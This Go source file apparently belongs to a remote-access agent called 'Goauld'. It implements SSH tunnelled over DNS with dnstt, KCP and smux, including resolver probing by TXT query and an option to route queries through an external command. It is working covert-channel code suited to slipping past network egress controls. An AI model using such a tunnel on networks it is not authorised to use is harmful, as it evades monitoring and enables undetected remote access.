package transport

import (
	"Goauld/agent/config"
	dns2 "Goauld/agent/ssh/transport/dns"
	"Goauld/common/log"
	commonnet "Goauld/common/net"
	"errors"
	"fmt"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	miekgDns "github.com/miekg/dns"
	"github.com/xtaci/kcp-go/v5"
	"github.com/xtaci/smux"
	"www.bamsoftware.com/git/dnstt.git/dns"
	"www.bamsoftware.com/git/dnstt.git/turbotunnel"
)

// DNSSH holds the connections used to tunnel SSH over DNS.
type DNSSH struct {
	udpConn       net.PacketConn
	pconn         net.PacketConn
	session       *smux.Session
	SSHStream     *smux.Stream
	ControlStream *smux.Stream
	kcpConn       *kcp.UDPSession
	streamsMutex  sync.Mutex
	streams       []*smux.Stream
	Started       bool
}

// smux streams will be closed after this much time without receiving data.
const idleTimeout = 2 * time.Minute

// dnsNameCapacity returns the number of bytes remaining for encoded data after
// including the domain in a DNS name.
func dnsNameCapacity(domain dns.Name) int {
	// Names must be 255 octets or shorter in total length.
	// https://tools.ietf.org/html/rfc1035#section-2.3.4
	capacity := 255
	// Subtract the length of the null terminator.
	capacity--
	for _, label := range domain {
		// Subtract the length of the label and the length octet.
		capacity -= len(label) + 1
	}
	// Each label may be up to 63 bytes long and requires 64 bytes to
	// encode.
	capacity = capacity * 63 / 64
	// Base32 expands every 5 bytes to 8.
	capacity = capacity * 5 / 8

	return capacity
}

func NewDNSSH() *DNSSH {
	return &DNSSH{
		Started: false,
	}
}

// Init initialize the DNS connection over DNS.
func (dnssh *DNSSH) Init(domain dns.Name, remoteAddr net.Addr, pconn net.PacketConn) error {
	mtu := dnsNameCapacity(domain) - 8 - 1 - numPadding - 1 // clientid + padding length prefix + padding + data length prefix
	if mtu < 80 {
		return fmt.Errorf("domain %s leaves only %d bytes for payload", domain, mtu)
	}

	log.Trace().Str("Mode", "DNSSH").Msgf("effective MTU %d (%s)", mtu, domain)

	// Open a KCP conn on the PacketConn.
	conn, err := kcp.NewConn2(remoteAddr, nil, 0, 0, pconn)
	if err != nil {
		return fmt.Errorf("opening KCP conn: %w", err)
	}

	log.Debug().Str("Mode", "DNSSH").Msgf("opening Session %08x", conn.GetConv())
	// Permit coalescing the payloads of consecutive sending.
	//nolint:staticcheck // SA1019
	conn.SetStreamMode(true)
	// Disable the dynamic congestion window (limit only by the maximum of
	// local and remote static windows).
	conn.SetNoDelay(
		0, // default nodelay
		0, // default interval
		0, // default resend
		1, // nc=1 => congestion window off
	)
	conn.SetWindowSize(turbotunnel.QueueSize/2, turbotunnel.QueueSize/2)
	if rc := conn.SetMtu(mtu); !rc {
		return errors.New("setting mtu failed")
	}

	// Start a smux Session on the Noise channel.
	smuxConfig := smux.DefaultConfig()
	smuxConfig.Version = 2
	smuxConfig.KeepAliveTimeout = idleTimeout
	smuxConfig.MaxStreamBuffer = 1 * 1024 * 1024 // default is 65 536
	sess, err := smux.Client( /*rw*/ conn, smuxConfig)
	if err != nil {
		return fmt.Errorf("error opening smux Session: %w", err)
	}

	sshStream, err := sess.OpenStream()
	if err != nil {
		return fmt.Errorf("error opening stream: %w", err)
	}

	controlStream, err := sess.OpenStream()
	if err != nil {
		return fmt.Errorf("error opening stream: %w", err)
	}

	dnssh.udpConn = pconn
	dnssh.pconn = pconn
	dnssh.session = sess
	dnssh.SSHStream = sshStream
	dnssh.ControlStream = controlStream
	dnssh.kcpConn = conn
	dnssh.streamsMutex = sync.Mutex{}

	return nil
}

// NewDNSSH returns a new DNSSH.
func (dnssh *DNSSH) Start() error {
	var domain dns.Name

	var remoteAddr net.Addr
	var udpConn net.PacketConn
	d := "127.0.0.1"
	port := 53
	if config.Get().GetDNSCommand() == "" {
		dnsServers := config.Get().DNSServer()
		for _, _dns := range dns2.GetDNSServers() {
			dnsServers = append(dnsServers, _dns.String())
		}
		log.Info().Str("Mode", "DNSSH").Str("Servers", strings.Join(dnsServers, ", ")).Msgf("Trying DNS servers")
		for _, domain := range dnsServers {
			p := 53
			var ip string
			split := strings.Split(domain, ":")
			if len(split) == 2 {
				ip = split[0]
				var err error
				p, err = strconv.Atoi(split[1])
				if err != nil {
					log.Debug().Err(err).Str("Mode", "DNSSH").Str("Domain", domain).Str("Port", split[1]).Msg("error parsing port, using 53 as default...")
					p = 53
				}
			} else {
				ip = domain
			}
			log.Debug().Str("IP", ip).Str("Mode", "DNSSH").Int("Port", p).Msgf("Testing DNS server availability")
			if TestDNSServer(ip, p, config.Get().DNSDomain()) {
				d = ip
				port = p

				break
			} else if TestDNSServer(ip, p, config.Get().DNSDomain()) {
				d = ip
				port = p

				break
			}
		}
		var err error
		log.Debug().Str("DNS", d).Str("Mode", "DNSSH").Int("port", port).Msg("dns server")
		domain, err = dns.ParseName(config.Get().DNSDomain())
		if err != nil {
			log.Error().Str("Mode", "DNSSH").Err(err).Str("Domain", config.Get().DNSDomain()).Msg("error parsing domain")

			return err
		}
		log.Info().Str("Mode", "DNSSH").Str("Domain", config.Get().DNSDomain()).Msg("DNS tunneling")

		// Iterate over the remote resolver address options and select one and
		// only one.

		remoteAddr, err = net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", d, port))
		if err != nil {
			return fmt.Errorf("error resolving remote address: %w", err)
		}
		udpConn, err = net.ListenUDP("udp", nil)
		if err != nil {
			return fmt.Errorf("error creating UDP connection: %w", err)
		}
	} else {
		// We are performing DNS request using an external system command.
		// The net.PacketCOnn is a mock that pipes WriteTo method to ReadFrom method.
		udpConn = dns2.NewFakePacketConn(4096 * 10)
		var err error
		domain, err = dns.ParseName(config.Get().DNSDomain())
		if err != nil {
			log.Error().Str("Mode", "DNSSH").Err(err).Str("Domain", config.Get().DNSDomain()).Msg("error parsing domain")

			return err
		}
		remoteAddr, err = net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", d, port))
		if err != nil {
			return fmt.Errorf("error resolving remote address: %w", err)
		}
	}

	pconn := NewDNSPacketConn(udpConn, remoteAddr, domain)
	err := dnssh.Init( /*pubkey,*/ domain, remoteAddr, pconn)
	if err != nil {
		return fmt.Errorf("error initializing DNS tunnel: %w", err)
	}
	dnssh.pconn = pconn
	dnssh.Started = true

	return nil
}

// TestDNSServer return whether the server DNS is reachable.
func TestDNSServer(ip string, port int, d string) bool {
	// Define the domain and DNS server
	isOpen := commonnet.CheckHostPortAvailability("udp", ip, port)
	srv := fmt.Sprintf("%s:%d", ip, port)
	if !isOpen {
		log.Debug().Str("Mode", "DNSSH").Str("Server", srv).Msg("No DNS server found")

		return false
	}
	log.Debug().Str("Mode", "DNSSH").Str("Server", srv).Msg("Testing DNS server (TXT)")
	domain := "ingesrkokreujy6zumkse43vobsxey3bnruwm4tbm5uwy2ltoruwgzlyobuwc3d.jmrxwg2lpovz." + d

	// Prepare the DNS client
	client := new(miekgDns.Client)
	message := new(miekgDns.Msg)
	message.SetQuestion(miekgDns.Fqdn(domain), miekgDns.TypeTXT)
	// 3) Disable DNSSEC: DO bit = false
	//    (EDNS UDP buffer size 4096, DNSSEC OK = false)
	message.SetEdns0(4096, false)

	// Send the DNS query to the specified server
	response, _, err := client.Exchange(message, srv)
	if err != nil {
		log.Debug().Err(err).Str("Mode", "DNSSH").Str("Domain", domain).Str("Server", srv).Msg("error testing DNS server")

		return false
	}

	// Check if we received any TXT records in the response
	if len(response.Answer) > 0 {
		for _, ans := range response.Answer {
			if txtRecord, ok := ans.(*miekgDns.TXT); ok {
				log.Debug().Str("Record", txtRecord.String()).Str("Domain", domain).Str("Server", srv).Msg("record found")

				return true
			}
		}
	}
	log.Debug().Str("Domain", domain).Str("Server", srv).Msg("no record found")

	return false
}

func (dnssh *DNSSH) OpenStream() (*smux.Stream, error) {
	s, err := dnssh.session.OpenStream()
	if err != nil {
		return nil, err
	}
	dnssh.streamsMutex.Lock()
	defer dnssh.streamsMutex.Unlock()
	dnssh.streams = append(dnssh.streams, s)

	return s, nil
}
func (dnssh *DNSSH) CloseStream() error {
	dnssh.streamsMutex.Lock()
	defer dnssh.streamsMutex.Unlock()
	errs := []error{}
	for _, stream := range dnssh.streams {
		errs = append(errs, stream.Close())
	}
	dnssh.streams = nil

	return errors.Join(errs...)
}

// Close closes all the connection used in the SSH over DNS.
func (dnssh *DNSSH) Close() error {
	errs := []error{}
	if dnssh.kcpConn != nil {
		errs = append(errs, dnssh.kcpConn.Close())
	}
	if dnssh.session != nil {
		errs = append(errs, dnssh.session.Close())
	}
	if dnssh.udpConn != nil {
		errs = append(errs, dnssh.udpConn.Close())
	}
	if dnssh.pconn != nil {
		errs = append(errs, dnssh.pconn.Close())
	}
	if dnssh.SSHStream != nil {
		errs = append(errs, dnssh.SSHStream.Close())
	}
	if dnssh.ControlStream != nil {
		errs = append(errs, dnssh.ControlStream.Close())
	}
	errs = append(errs, dnssh.CloseStream())

	return errors.Join(errs...)
}
